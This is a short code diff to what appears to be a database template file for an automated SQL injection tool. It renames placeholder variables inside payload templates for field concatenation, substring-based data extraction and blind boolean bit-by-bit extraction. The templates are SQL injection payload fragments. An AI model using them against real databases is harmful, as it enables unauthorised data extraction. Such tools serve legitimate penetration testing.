@@ -101,7 +101,7 @@ resource:
         ${limit}
     )
    fields: 
-    field: trim(coalesce(${field}, ''))
+    field: trim(coalesce(${field.value}, ''))
     concat: "|| '%7f' ||"
     
 strategy: 
@@ -115,7 +115,7 @@ strategy:
        || NULLIF (
            substr (
                (${injection}),
-               ${index},
+               ${window.char},
                65536
            ),
            '${trail_sql}'
@@ -166,13 +166,13 @@ strategy:
         ascii(
             substr(
                 (${injection}),
-                ${index},
+                ${window.char},
                 1
             )
         ),
         ${bit}
     )
-   length: length((${injection})) > ${index}
+   length: length((${injection})) > ${window.char}
   modeAnd: and
   modeOr: or
   blind: ${boolean.mode} ${test}
